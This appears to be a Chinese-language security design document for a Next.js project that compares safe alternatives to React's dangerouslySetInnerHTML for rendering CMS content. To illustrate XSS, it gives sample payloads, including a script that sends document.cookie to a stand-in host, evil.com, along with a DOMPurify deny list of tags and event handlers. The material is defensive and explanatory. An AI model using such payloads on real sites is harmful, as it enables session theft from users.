# dangerouslySetInnerHTML 安全解决方案

> 项目: validate-nextjs-emotion | 版本: 2.0 | 日期: 2026-06-10

---

## 执行摘要与建议

```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│   SSR 性能排名：                                              │
│                                                             │
│   StructuredRenderer  ✅ 完全 SSR（服务端组件）               │
│   MarkdownRenderer    ✅ 完全 SSR（服务端组件）               │
│   RTERenderer         ⚠️ 部分 SSR（需要 'use client'）      │
│   SanitizedHTMLRender ❌ 无 SSR（仅客户端）                  │
│                                                             │
│   安全排名：                                                 │
│                                                             │
│   StructuredRenderer  ✅ 完全没有 HTML                       │
│   MarkdownRenderer    ✅ 安全的文本格式                       │
│   RTERenderer         ✅ JSON AST（结构化）                  │
│   SanitizedHTMLRender ⚠️ 最后手段（消毒后 HTML）             │
│                                                             │
│   核心建议：                                                 │
│   优先选择 结构化 → Markdown → RTE JSON → DOMPurify         │
│   这样可以同时获得最佳安全性和最佳 SSR 性能。                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 🏆 方案优先级（按安全性和 SSR 质量排序）

| 优先级 | 方案 | 安全性 | SSR 质量 | 适用场景 |
|--------|------|--------|----------|---------|
| 🥇 首选 | **结构化内容**（方案一） | 🟢 完全没有 HTML | ✅ 完全 SSR | 新建 CMS 项目 |
| 🥇 首选 | **Markdown 渲染**（方案三） | 🟢 安全的文本格式 | ✅ 完全 SSR | 博客、文档、评论 |
| 🥈 推荐 | **RTE JSON 渲染**（方案四） | 🟢 JSON AST | ⚠️ 部分 SSR | 富文本编辑器 |
| 🥉 备选 | **DOMPurify 消毒**（方案二） | 🟡 消毒后 HTML | ❌ 无 SSR | 遗留 HTML 迁移 |

> **⚠️ 当前项目状态**：项目中唯一的 `dangerouslySetInnerHTML` 使用在 `emotion-registry.tsx`（CSS-in-JS SSR），这是**安全的**——它只处理库生成的 CSS，从不处理用户输入。详见[第 2 节](#2-项目现状分析)。

### 🔒 已有安全模式（无需处理）

| 组件 | 原因 | 文件 |
|------|------|------|
| `EmotionRegistry` | 仅处理 CSS 内容，无用户输入 | [src/lib/emotion-registry.tsx](src/lib/emotion-registry.tsx) |
| `styled-components registry` | 使用 `getStyleElement()` 返回 React 元素，未使用 `dangerouslySetInnerHTML` | [src/lib/styled-components-registry.tsx](src/lib/styled-components-registry.tsx) |

### 📊 快速决策流程

```
需要渲染 CMS 内容？
├── 数据是结构化 JSON？ → StructuredRenderer  (🥇 最佳 SSR + 安全)
├── 是 Markdown 文本？  → MarkdownRenderer    (🥇 最佳 SSR + 安全)
├── 是 RTE JSON (TipTap)？→ RTERenderer       (🥈 良好，需要 'use client')
└── 是原始 HTML（遗留）？→ SanitizedHTMLRender (🥉 最后手段，无 SSR)
```

---

## 快速导航

| 如果你想知道... | 直接跳到... |
|----------------|-------------|
| 当前项目中的 `dangerouslySetInnerHTML` 是否安全？ | [项目现状分析](#2-项目现状分析) |
| SSR 服务端渲染对每个方案有什么影响？ | [SSR 兼容性矩阵](#5-ssr-兼容性矩阵) |
| 如何在 SSR 中安全渲染 CMS 用户内容？ | [方案一：结构化内容](#31-方案一结构化内容渲染推荐) |
| 如何在 SSR 中安全处理遗留 HTML 数据？ | [方案二：DOMPurify 消毒](#32-方案二dompurify-html-消毒备选) |
| 如何在 SSR 中安全渲染博客文章？ | [方案三：Markdown 渲染](#33-方案三markdown-渲染适合博客文档) |
| 如何在 SSR 中使用富文本编辑器（TipTap）？ | [方案四：RTE JSON 渲染](#34-方案四rte-json-渲染适合富文本编辑) |
| 哪种方案最适合我的场景？ | [决策矩阵](#4-决策矩阵) |
| XSS 攻击是如何被阻止的？ | [附录：XSS 攻击演示](#附录xss-攻击演示) |

---

## 1. 问题概述

### 1.1 什么是 `dangerouslySetInnerHTML`？

这是 React 提供的一个底层 API，用于直接将 HTML 字符串插入 DOM。与 React 默认渲染（自动转义所有文本）不同，这个 API 告诉 React：**"相信我，我知道我在用这个 HTML 做什么。"**

```tsx
// ⚠️ 危险模式：直接插入 HTML，React 不会做任何转义
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

**为什么叫 "dangerously"（危险地）？** React 团队故意用这个命名来提醒开发者：这个 API 会绕过 React 内置的 XSS（跨站脚本攻击）防护机制。这是一个**有意为之的逃生舱**，不是可以随便使用的东西。

### 1.2 为什么在 CMS 中这是个问题？

CMS（内容管理系统）的核心特点是**内容由用户创建**。如果用户输入的内容包含恶意 HTML，直接使用 `dangerouslySetInnerHTML` 会导致 XSS 攻击：

```html
<!-- 用户提交的内容可能包含： -->
<script>
  // 窃取 Cookie
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

<img src="x" onerror="executeMaliciousCode()" />

<a href="javascript:alert('XSS')">点击有惊喜</a>

<iframe src="https://phishing-site.com/login"></iframe>

<style>
  body { display: none; }
</style>
```

> **一句话总结**：`dangerouslySetInnerHTML` 本身不是 bug，但**对用户输入不加处理地使用它**就是安全漏洞。

### 1.3 解决方案的整体架构

```
                     ┌─────────────────────────┐
                     │     CMS 内容来源          │
                     └────────────┬────────────┘
                                  │
                     ┌────────────▼────────────┐
                     │    内容类型路由器         │
                     └────────────┬────────────┘
                                  │
         ┌────────────────────────┼────────────────────────┐
         │                        │                        │
         ▼                        ▼                        ▼
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│  结构化 JSON    │    │  Markdown/RTE   │    │  DOMPurify      │
│  内容           │    │  文本内容        │    │  HTML 内容       │
│                 │    │                 │    │                 │
│  🥇 首选       │    │  🥇 首选       │    │  🥈 备选       │
└─────────────────┘    └─────────────────┘    └─────────────────┘
         │                        │                        │
         ▼                        ▼                        ▼
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│  React 组件     │    │  react-markdown │    │  DOMPurify      │
│  (没有 HTML!)   │    │  (天然安全)     │    │  消毒处理        │
└─────────────────┘    └─────────────────┘    └─────────────────┘
         │                        │                        │
         └────────────────────────┼────────────────────────┘
                                  │
                         ┌────────▼────────┐
                         │   安全的 DOM     │
                         │   (没有 XSS)    │
                         └─────────────────┘
```

---

## 2. 项目现状分析

### 2.1 现有 `dangerouslySetInnerHTML` 使用情况

| # | 位置 | 文件 | 内容来源 | 风险等级 | 建议 |
|---|------|------|---------|---------|------|
| 1 | `src/lib/emotion-registry.tsx` (第 ~31 行) | [emotion-registry.tsx](src/lib/emotion-registry.tsx) | Emotion 库内部生成的 CSS | ✅ **低风险 — 无需处理** | 保留，加注释说明 |
| 2 | `src/lib/styled-components-registry.tsx` | [styled-components-registry.tsx](src/lib/styled-components-registry.tsx) | 使用 `getStyleElement()` 返回 React 元素（未使用该 API） | ✅ **无风险** | 无需处理 |
| 3 | 未来 CMS 用户生成的 HTML | 尚无（不在项目中） | 直接用户输入 | ❌ **高风险** | 必须使用本文档的方案 |

### 2.2 Emotion Registry 为什么安全？（详细分析）

```tsx
// src/lib/emotion-registry.tsx
'use client';

import { useState } from 'react';
import { CacheProvider } from '@emotion/react';
import createCache from '@emotion/cache';
import { useServerInsertedHTML } from 'next/navigation';

export default function EmotionRegistry({
  children,
}: {
  children: React.ReactNode;
}) {
  const [cache] = useState(() => {
    const cache = createCache({ key: 'css' });
    cache.compat = true;
    return cache;
  });

  useServerInsertedHTML(() => {
    // ↓↓↓ 项目中唯一的 dangerouslySetInnerHTML 使用 ↓↓↓
    const entries = cache.inserted;
    const styles = Object.keys(entries).map((key) => entries[key]);
    return (
      <style
        data-emotion={`${cache.key} ${Object.keys(entries).join(' ')}`}
        dangerouslySetInnerHTML={{ __html: styles.join('') }}
      />
    );
  });

  return <CacheProvider value={cache}>{children}</CacheProvider>;
}
```

**三个安全理由：**

1. **内容来源** 🛡️ — `styles` 数据完全由 Emotion 库的内部缓存（`cache.inserted`）生成，仅包含 React 组件明确定义的 CSS 类名和样式规则。没有任何用户输入能到达这个代码路径。

2. **内容类型** 🛡️ — 内容是纯 CSS 代码（例如 `.css-abc123 { color: red; }`），不是带有可执行元素的 HTML。CSS 不包含可执行的 `<script>` 标签或事件处理器。

3. **技术必要性** 🛡️ — 在 React SSR 环境中，`<style>` 标签不能使用 `children` 来放置内容，因为 CSS 中的特殊字符（如 `>`、`&`、`:`）会被 React 的 JSX 转义机制自动转义，导致样式失效。这是**唯一**能在 SSR 中注入样式的方式，所有 CSS-in-JS 库都使用这个模式。

> 这是 Emotion、styled-components 和 MUI 在其 SSR registry 中使用的行业标准模式，被广泛认为是安全的。

---

## 3. 解决方案

### 核心原则

```
首选：结构化数据 (JSON) → 文本格式 (Markdown) → 最后手段：消毒后的 HTML
```

---

### 3.1 方案一：结构化内容渲染（推荐）

**适用于**：新建 CMS 项目、从零开始重构的内容系统

**核心理念**：内容不再存储为 HTML 字符串，而是拆分为**有类型的 JSON 数据块**。每个块类型映射到对应的 React 组件，由该组件控制自己的渲染。

#### 架构

```
┌─────────────────────────────────────────────────────────┐
│                   CMS 数据库 (JSON)                      │
│  ┌────────────┬────────────┬────────────┬────────────┐  │
│  │ 标题       │  段落      │  图片      │  代码      │  │
│  │ {level:2,  │ {text:     │ {src, alt, │ {language,│  │
│  │  text:"Hi"}|  "body"}   │  caption}  │  code}    │  │
│  └────────────┴────────────┴────────────┴────────────┘  │
└──────────────────────┬──────────────────────────────────┘
                       │ JSON.parse()
                       ▼
┌─────────────────────────────────────────────────────────┐
│              StructuredRenderer (路由器)                  │
│                                                          │
│  段落    → <ParagraphBlock data={...} />                  │
│  标题    → <HeadingBlock   data={...} />                  │
│  图片    → <ImageBlock     data={...} />                  │
│  代码    → <CodeBlock      data={...} />                  │
│  列表    → <ListBlock      data={...} />                  │
│  引用    → <QuoteBlock     data={...} />                  │
│  分割线  → <DividerBlock   data={...} />                  │
└─────────────────────────────────────────────────────────┘
```

#### 为什么这样更安全？

```tsx
// ❌ 危险 — HTML 字符串方式
const html = '<h2>' + userInput.title + '</h2>';  // 可以注入 </h2><script>...
<div dangerouslySetInnerHTML={{ __html: html }} />

// ✅ 安全 — 结构化 JSON 方式
const data = { level: 2, text: userInput.title };
// React 自动转义：'<script>alert(1)</script>' → React 文本节点 → 安全
<HeadingBlock data={data} />
```

**关键安全属性：**

| 属性 | 实现方式 |
|------|---------|
| **没有 HTML 拼接** | 内容以 JSON 对象传递，从不拼接成 HTML 字符串 |
| **自动转义** | React 的文本渲染自动转义 `<`、`>`、`&`、`"`、`'` |
| **组件隔离** | 每个块类型有自己的 React 组件，控制输出内容 |
| **类型安全** | TypeScript 在编译时验证每个块数据的结构 |

#### SSR 行为

```tsx
// ✅ StructuredRenderer 是一个服务端组件（没有 'use client'）
// 它在服务器上渲染，生成包含所有内容的 HTML。
// 内容的显示不需要客户端 JavaScript。
//
// 服务端输出：<div class="structured-content">
//               <h2>欢迎</h2>
//               <p>正文...</p>
//             </div>
// ✓ 完全 SSR：所有内容都在初始 HTML 中
// ✓ 兼容 SSG：在构建时预渲染为静态 HTML
// ✓ 内容的显示不需要客户端 JavaScript

import { StructuredRenderer } from '@/components/structured-renderer';
// 注意：没有 'use client' — 可以在服务端组件中使用！

export default async function ArticlePage() {
  const content = await fetchContent(); // 在服务端组件中获取数据
  return <StructuredRenderer content={content} />;
}
```

#### 使用示例

```tsx
import { StructuredRenderer } from '@/components/structured-renderer';

// CMS 返回的结构化 JSON 内容
const content = {
  blocks: [
    {
      id: '1',
      type: 'heading',
      data: { level: 2, text: '欢迎来到我们的博客' },
    },
    {
      id: '2',
      type: 'paragraph',
      data: { text: '这是文章正文内容。' },
    },
    {
      id: '3',
      type: 'image',
      data: {
        src: 'https://images.unsplash.com/photo-1',
        alt: '美丽的风景',
        caption: '摄影：John Doe',
      },
    },
  ],
};

// 直接渲染 — 不需要 dangerouslySetInnerHTML！
<StructuredRenderer content={content} />
```

#### 已实现的块组件

| 组件 | 类型 | 用途 | 数据形状 |
|------|------|------|---------|
| `ParagraphBlock` | `paragraph` | 段落文本，支持可选样式 | `{ text: string }` |
| `HeadingBlock` | `heading` | 标题 (h1-h6) | `{ level: 1-6, text: string }` |
| `ImageBlock` | `image` | 图片，受控属性 | `{ src, alt, caption? }` |
| `CodeBlock` | `code` | 代码块，带行号 | `{ language, code }` |
| `ListBlock` | `list` | 有序/无序列表 | `{ style: 'ordered'|'bullet', items[] }` |
| `QuoteBlock` | `quote` | 引用块，可选署名 | `{ text, author? }` |
| `DividerBlock` | `divider` | 水平分隔线 | `{ style? }` |

#### 如何扩展：添加新的块类型

三步即可完成：

```typescript
// 第一步：src/types/content.ts — 添加类型
export type ContentBlockType = 'paragraph' | 'heading' | 'image' | 'code' | 'list' | 'quote' | 'divider' | 'video';

// 第二步：src/components/blocks/video-block.tsx — 创建组件
'use client';
import { VideoBlockData } from '@/types/content';

export function VideoBlock({ data }: { data: VideoBlockData }) {
  return (
    <div className="video-wrapper">
      <video
        src={data.src}
        controls
        poster={data.poster}
        width="100%"
      />
      {data.caption && <p className="caption">{data.caption}</p>}
    </div>
  );
}

// 第三步：src/lib/content-registry.tsx — 注册
import { VideoBlock } from "@/components/blocks/video-block";

export const BLOCK_REGISTRY = {
  video: VideoBlock,
  paragraph: ParagraphBlock,
  heading: HeadingBlock,
  // ... 已有类型
} as const;
```

#### 核心实现：内容注册表模式

```tsx
// src/lib/content-registry.tsx
import type { ContentBlock, ContentBlockType } from "@/types/content";

// 注册表：映射块类型 → React 组件
export const BLOCK_REGISTRY: Record<ContentBlockType, React.ComponentType<{
  data: ContentBlock['data'];
}>> = {
  paragraph: ParagraphBlock,
  heading: HeadingBlock,
  image: ImageBlock,
  code: CodeBlock,
  list: ListBlock,
  quote: QuoteBlock,
  divider: DividerBlock,
};

// 渲染函数：类型安全查找
export function renderBlock(block: ContentBlock): React.ReactNode {
  const Component = BLOCK_REGISTRY[block.type];
  if (!Component) {
    console.warn(`未知的块类型: ${block.type}`);
    return null;
  }
  return <Component key={block.id} data={block.data} />;
}
```

---

### 3.2 方案二：DOMPurify HTML 消毒（备选）

**适用于**：遗留 HTML 数据迁移、第三方 HTML 内容集成、渐进式迁移

**核心理念**：如果必须使用 HTML（例如迁移现有内容），在注入 DOM 之前先用 DOMPurify 库**洗掉所有危险部分**。

#### DOMPurify 如何工作

DOMPurify 是由 Cure53（一家知名安全研究公司）开发的库，它通过浏览器的原生 DOMParser 解析 HTML 并移除所有危险内容：

```
输入:  <h2>安全标题</h2><script>alert('XSS')</script><img src=x onerror=攻击(1)>
                                                      │
                                                      ▼
                                    ┌─────────────────────────────┐
                                    │      DOMPurify 引擎         │
                                    │                             │
                                    │  1. 通过 DOMParser 解析     │
                                    │  2. 遍历 DOM 树             │
                                    │  3. 检查每个节点            │
                                    │  4. 移除危险节点            │
                                    │  5. 序列化回 HTML           │
                                    └─────────────────────────────┘
                                                      │
                                                      ▼
输出: <h2>安全标题</h2><img src="x">
```

#### SSR 行为（关键！）

```tsx
// ╔════════════════════════════════════════════════════════════════════╗
// ║              DOMPurify 的 SSR 渲染流程                              ║
// ╠════════════════════════════════════════════════════════════════════╣
// ║                                                                    ║
// ║  1. SSR 渲染（服务器）                                              ║
// ║     ↓ <SanitizedHTMLRenderer html={...} />                         ║
// ║     ↓ 组件渲染 → 返回 null（还没有 HTML）                          ║
// ║     ↓ 服务器发送的页面 HTML 中不含用户内容                          ║
// ║                                                                    ║
// ║  2. 水合（浏览器）                                                  ║
// ║     ↓ React 水合页面                                                ║
// ║     ↓ useEffect 触发 → 调用 sanitizeHTML(html)                     ║
// ║     ↓ DOMPurify 在浏览器 DOM 中消毒 HTML                           ║
// ║     ↓ setState 触发重新渲染，显示消毒后的内容                       ║
// ║                                                                    ║
// ║  ⚠️ 关键权衡：内容不会出现在 SSR HTML 中                           ║
// ║     这意味着原始 HTML 永远不会出现在服务端响应中。                  ║
// ║     内容在 JavaScript 加载完成之后才会渲染。                        ║
// ║                                                                    ║
// ╚════════════════════════════════════════════════════════════════════╝

// 异步 sanitizeHTML() — 在 SSR 中可用，但内容在客户端渲染
import { sanitizeHTML } from '@/lib/sanitize-html';
// ↑ 使用 isomorphic-dompurify，服务器优雅降级

// 同步 sanitizeHTMLSync() — 仅客户端，避免水合不匹配
import { sanitizeHTMLSync } from '@/lib/sanitize-html';
// ↑ 使用浏览器 dompurify，如果在服务器调用会发出警告

// 为什么要用异步？DOMPurify 需要 DOM 的 DOMParser API。
// isomorphic-dompurify 提供了服务端垫片，但不够可靠。
// 最安全的方式：在客户端消毒，永远不暴露原始 HTML。
```

#### 安全配置

所有消毒规则定义在 `src/lib/sanitize-config.ts` 中：

```typescript
// src/lib/sanitize-config.ts
import type { Config } from 'dompurify';

export const SANITIZE_CONFIG: Config = {
  // ✅ 允许的标签（其他全部删除）
  ALLOWED_TAGS: [
    // 文本格式化
    'p', 'br', 'strong', 'b', 'em', 'i', 'u', 's', 'sub', 'sup',
    'span', 'div', 'pre', 'code',
    // 标题
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    // 列表
    'ul', 'ol', 'li',
    // 链接和媒体
    'a', 'img',
    // 块级元素
    'blockquote', 'hr', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
  ],

  // ❌ 明确禁止的标签（额外安全层）
  FORBID_TAGS: [
    'script', 'style', 'iframe', 'object', 'embed', 'form',
    'input', 'button', 'select', 'textarea', 'meta', 'link',
    'base', 'frameset', 'frame', 'applet', 'canvas',
  ],

  // ❌ 明确禁止的属性
  FORBID_ATTR: [
    // 事件处理器（主要 XSS 攻击向量）
    'onerror', 'onload', 'onclick', 'onmouseover', 'onmouseout',
    'onfocus', 'onblur', 'onchange', 'onsubmit', 'onkeydown',
    'onkeyup', 'onkeypress', 'onscroll', 'onresize', 'onabort',
    'onbeforeunload', 'onhashchange', 'onpopstate', 'onstorage',
    // 危险属性
    'style',  // CSS 攻击
    'srcdoc', 'sandbox',  // iframe 相关（即使 iframe 已被禁止）
  ],

  // ✅ HTML5 特定设置
  ADD_ATTR: ['target', 'rel'],  // 允许链接的这些特定属性

  // ✅ URL 协议白名单
  ALLOWED_URI_REGEXP: /^(?:(?:https?|ftp|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.-:]|$))/i,
  // 只允许：http://, https://, ftp://, mailto:
  // 阻止：javascript:, data:, vbscript:, file:,
};
```

#### SSR 安全的消毒函数

```typescript
// src/lib/sanitize-html.ts
/**
 * SSR 安全的 HTML 消毒工具。
 *
 * 使用 isomorphic-dompurify，在服务端和客户端环境中都能工作。
 * 在 DOMPurify 不可用的环境中降级为空操作。
 */

import { SANITIZE_CONFIG } from './sanitize-config';
import type DOMPurify from 'dompurify';

let purifyInstance: typeof DOMPurify | null = null;

/**
 * 延迟加载 DOMPurify，兼容 SSR。
 */
async function getPurify(): Promise<typeof DOMPurify> {
  if (purifyInstance) return purifyInstance;

  if (typeof window !== 'undefined') {
    // 客户端：使用浏览器 DOMPurify
    const dompurify = await import('dompurify');
    purifyInstance = dompurify.default;
  } else {
    // 服务端：使用 isomorphic-dompurify（服务端兼容包装）
    const dompurify = await import('isomorphic-dompurify');
    purifyInstance = dompurify.default as unknown as typeof DOMPurify;
  }

  return purifyInstance;
}

/**
 * 消毒 HTML 字符串，安全渲染（异步，兼容 SSR）。
 */
export async function sanitizeHTML(html: string): Promise<string> {
  if (!html) return '';
  try {
    const purify = await getPurify();
    const result = purify.sanitize(html, SANITIZE_CONFIG);
    return typeof result === 'string' ? result : '';
  } catch (error) {
    console.error('[sanitizeHTML] DOMPurify 消毒失败:', error);
    return '';
  }
}

/**
 * 同步版本，用于 hooks/useMemo。
 * 仅在浏览器环境中可用。
 */
export function sanitizeHTMLSync(html: string): string {
  if (!html) return '';
  if (typeof window === 'undefined') {
    console.warn(
      '[sanitizeHTMLSync] 在服务端调用。请改用 sanitizeHTML（异步）。为确保安全，返回空字符串。'
    );
    return '';
  }
  try {
    const dompurify = require('dompurify');
    const result = dompurify.sanitize(html, SANITIZE_CONFIG);
    return typeof result === 'string' ? result : '';
  } catch (error) {
    console.error('[sanitizeHTMLSync] DOMPurify 消毒失败:', error);
    return '';
  }
}
```

#### 在组件中使用（SSR 安全）

```tsx
'use client';

import { useState, useEffect } from 'react';
import { sanitizeHTML } from '@/lib/sanitize-html';

// 方式 A：异步 SSR 安全的 SanitizedHTMLRenderer（推荐）
import { SanitizedHTMLRenderer } from '@/components/sanitized-html-renderer';

// 三种模式：
// 'auto'   （默认）：异步 sanitizeHTML() — 兼容 SSR，水合后显示内容
// 'ssr'              ：强制使用异步路径
// 'client'           ：客户端同步路径（更快）
<SanitizedHTMLRenderer html={userInput} mode="auto" />

// 方式 B：手动异步方式
function SafeHTMLRenderer({ html }: { html: string }) {
  const [clean, setClean] = useState('');
  useEffect(() => {
    sanitizeHTML(html).then(setClean);
  }, [html]);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

> **⚠️ 重要说明**：这个方案在底层仍然使用了 `dangerouslySetInnerHTML`，但**仅在 HTML 经过彻底消毒之后**。这是**最后的手段**——仅在方案一或方案三不可行时使用。内容不会出现在 SSR HTML 中 — 它在水合后在客户端渲染。

---

### 3.3 方案三：Markdown 渲染（适合博客/文档）

**适用于**：博客文章、文档页面、用户评论、论坛帖子

**核心理念**：Markdown 是一种**天生安全的文本格式**——它没有执行 JavaScript 的能力。只通过受控的语法支持文本格式化、链接、图片和代码块。

#### Markdown 为什么天然安全

| 能力 | Markdown 语法 | 能执行 JS 吗？ |
|------|---------------|---------------|
| 加粗文字 | `**文字**` | ❌ 不能 |
| 斜体文字 | `*文字*` | ❌ 不能 |
| 链接 | `[文字](url)` | ❌ 不能（内置安全） |
| 图片 | `![alt](src)` | ❌ 不能（受控输出） |
| 代码块 | ````代码```` | ❌ 不能（显示为文本） |
| 标题 | `# 标题` | ❌ 不能 |
| 列表 | `- 项目` / `1. 项目` | ❌ 不能 |
| 表格 | `\| 列 \| 列 \|` | ❌ 不能 |
| HTML 注入 | `<script>` | ❌ 被 rehype-sanitize 剥离 |
| 事件处理器 | `onerror=` | ❌ 被 rehype-sanitize 剥离 |

#### 安全架构

```
用户 Markdown 输入
    │
    ▼
┌─────────────────────┐
│  remark (解析器)    │  → 解析 Markdown 为 mdast（Markdown AST）
│  remark-gfm         │  → GitHub Flavored Markdown 支持
└─────────┬───────────┘
          ▼
┌─────────────────────┐
│  rehype (编译器)    │  → 将 mdast 转换为 hast（HTML AST）
└─────────┬───────────┘
          ▼
┌─────────────────────┐
│  rehype-sanitize    │  🛡️ 安全层：剥离危险的 HTML
└─────────┬───────────┘
          ▼
┌─────────────────────┐
│  react-markdown     │  → 将 hast 渲染为 React 组件
│  (React, 不是HTML!) │  → 所有文本经过 React 的转义机制
└─────────────────────┘
          ▼
     安全的 DOM 内容
```

#### SSR 行为

```tsx
// ✅ MarkdownRenderer 是一个服务端组件（没有 'use client' 指令）
// react-markdown 完全在服务端工作。它将 markdown 解析为 AST
// 并渲染 React 元素 — 不需要浏览器 API。
//
// SSR 输出：<div class="markdown-content">
//             <h1>标题</h1>
//             <p><strong>加粗</strong> 文字</p>
//             <pre><code>代码</code></pre>
//           </div>
// ✓ 完全 SSR：所有内容嵌入在初始 HTML 中
// ✓ 兼容 SSG：在构建时预渲染为静态 HTML
// ✓ 不需要客户端渲染

import { MarkdownRenderer } from '@/components/markdown-renderer';
// 注意：没有 'use client' — 可以在任何服务端组件中使用！

export default async function BlogPage() {
  const content = await fetchMarkdown(); // 在服务端获取
  return <MarkdownRenderer content={content} />;
  // → 所有 HTML 在初始负载中发送到浏览器
}
```

#### 实现

```tsx
// src/components/markdown-renderer.tsx
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import rehypeSanitize from 'rehype-sanitize';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { oneDark } from 'react-syntax-highlighter/dist/esm/styles/prism';

interface MarkdownRendererProps {
  content: string;         // 原始 Markdown 字符串
  className?: string;      // 可选的额外类名
}

export function MarkdownRenderer({
  content,
  className = '',
}: MarkdownRendererProps) {
  if (!content) return null;

  return (
    <div className={`markdown-content ${className}`}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={[rehypeSanitize]}
        // 🛡️ 链接安全：所有链接在新标签页打开，带 noopener
        linkTarget="_blank"
        // 🛡️ 自定义链接组件，提供额外安全
        components={{
          a: ({ href, children }) => (
            <a
              href={href}
              target="_blank"
              rel="noopener noreferrer nofollow"
            >
              {children}
            </a>
          ),
          img: ({ src, alt }) => (
            <img
              src={src}
              alt={alt || ''}
              loading="lazy"
              // 🛡️ 没有 onerror，没有 onclick — 只有安全属性
            />
          ),
          code: ({ className, children, ...props }) => {
            const match = /language-(\w+)/.exec(className || '');
            const isInline = !match;
            return isInline ? (
              <code {...props}>{children}</code>
            ) : (
              <SyntaxHighlighter
                style={oneDark}
                language={match[1]}
                PreTag="div"
              >
                {String(children).replace(/\n$/, '')}
              </SyntaxHighlighter>
            );
          },
        }}
      >
        {content}
      </ReactMarkdown>
    </div>
  );
}
```

#### 使用示例

```tsx
import { MarkdownRenderer } from '@/components/markdown-renderer';

const blogPost = `
# 开始使用 Next.js

Next.js 是一个用于生产的 **React 框架**。

## 特性

- ✅ **服务端渲染** — 页面在服务器上渲染
- ✅ **静态站点生成** — 页面在构建时预生成
- ✅ **基于文件的路由** — 无需配置

## 代码示例

\`\`\`typescript
// 这显示为文本，绝不执行
const greeting: string = "你好，世界！";
console.log(greeting);
\`\`\`

> **试试看**：上面的代码永远不会执行，因为 react-markdown
> 将其渲染为纯文本，而不是活跃的脚本！
`;

export default function BlogPage() {
  return <MarkdownRenderer content={blogPost} />;
}
```

---

### 3.4 方案四：RTE JSON 渲染（适合富文本编辑）

**适用于**：需要富文本编辑功能的内容——新闻文章、编辑内容、知识库页面

**核心理念**：现代富文本编辑器（TipTap、Slate.js、Facebook 的 Lexical）默认输出的是 **JSON AST（抽象语法树）**，而不是 HTML 字符串。这使得渲染过程天然安全，因为内容是结构化数据，而不是标记语言。

#### 正确 vs 错误的 RTE 使用模式

```tsx
// ❌ 错误模式 — 极其危险
const html = editor.getHTML();
// ↑ 返回原始 HTML：<p>Hello <script>alert('xss')</script></p>
<div dangerouslySetInnerHTML={{ __html: html }} />
// ↑ 用户可以在编辑器中输入 script 标签！

// ✅ 正确模式 — 安全设计
const json = editor.getJSON();
// ↑ 返回结构化的 JSON：
//   { type: "doc", content: [{ type: "paragraph", content: [
//     { type: "text", text: "Hello " },
//     { type: "text", text: "</p><script>alert('xss')</script>" }
//   ]}]}
//   ↑ 用户的恶意输入被转义为文本，不是可执行的标记！
<RTERenderer content={json} />
```

#### SSR 行为

```tsx
// ⚠️ RTERenderer 有 'use client' 指令（需要 React.createElement）
//
// SSR 输出：<div class="rte-content">
//             <h2>文章标题</h2>
//             <p>正文...</p>
//           </div>
// ✓ SSR 可以工作，因为 JSON 数据作为 props 传递
// ✓ 需要客户端指令是因为动态创建元素
// ✓ 内容会嵌入在 SSR HTML 中
//
// ⚠️ 如果块级子组件使用 Emotion css() prop，
//    每个子组件必须是客户端组件或用 'use client' 包装。

'use client'; // React.createElement 动态标签需要

import { RTERenderer } from '@/components/rte-renderer';

// 在任何页面中都可以工作，在服务端渲染内容
<RTERenderer content={rteJson} />
```

#### 理解 JSON AST

TipTap（基于 ProseMirror）将内容表示为 JSON 树：

```json
{
  "type": "doc",
  "content": [
    {
      "type": "heading",
      "attrs": { "level": 2 },
      "content": [
        { "type": "text", "text": "文章标题" }
      ]
    },
    {
      "type": "paragraph",
      "content": [
        {
          "type": "text",
          "marks": [{ "type": "bold" }],
          "text": "这是加粗文字"
        },
        {
          "type": "text",
          "text": " — 这是普通文字"
        }
      ]
    },
    {
      "type": "paragraph",
      "content": [
        {
          "type": "text",
          "marks": [
            { "type": "link", "attrs": { "href": "https://example.com" } }
          ],
          "text": "点击这里"
        }
      ]
    }
  ]
}
```

**每个文本节点只是一个字符串**——用户无法注入 HTML 标签，因为结构由 JSON 模式决定，而不是由字符串拼接决定。

#### RTE 渲染器实现

```tsx
// src/components/rte-renderer.tsx
'use client';

import { useMemo } from 'react';
import { generateHTML } from '@tiptap/react';
import StarterKit from '@tiptap/starter-kit';
import ImageExtension from '@tiptap/extension-image';
import LinkExtension from '@tiptap/extension-link';
import { sanitizeHTML } from '@/lib/sanitize-html';

interface RTERendererProps {
  content: Record<string, unknown> | string;  // TipTap JSON 或 HTML 备用
  className?: string;
}

export function RTERenderer({
  content,
  className = '',
}: RTERendererProps) {
  // 检查内容是 JSON（首选）还是遗留 HTML
  const isJSON = typeof content === 'object' && content !== null;

  return (
    <div className={`rte-content ${className}`}>
      {isJSON ? (
        <JSONRenderer json={content as Record<string, unknown>} />
      ) : (
        <LegacyHTMLRenderer html={content as string} />
      )}
    </div>
  );
}

/** 将 TipTap JSON 内容渲染为 React 元素 */
function JSONRenderer({ json }: { json: Record<string, unknown> }) {
  const rendered = useMemo(() => {
    try {
      // 将 TipTap JSON 转换回 HTML
      const html = generateHTML(json as any, [
        StarterKit.configure({
          heading: { levels: [1, 2, 3, 4, 5, 6] },
          codeBlock: true,
          bulletList: true,
          orderedList: true,
          blockquote: true,
          horizontalRule: true,
        }),
        ImageExtension,
        LinkExtension.configure({
          openOnClick: false,
          HTMLAttributes: {
            rel: 'noopener noreferrer nofollow',
            target: '_blank',
          },
        }),
      ]);
      return html;
    } catch {
      return '';
    }
  }, [json]);

  // HTML 来自受控的 JSON → 安全渲染
  return <div dangerouslySetInnerHTML={{ __html: rendered }} />;
}

/** 用 DOMPurify 消毒渲染遗留 HTML */
function LegacyHTMLRenderer({ html }: { html: string }) {
  return <SanitizedHTMLRenderer html={html} />;
}
```

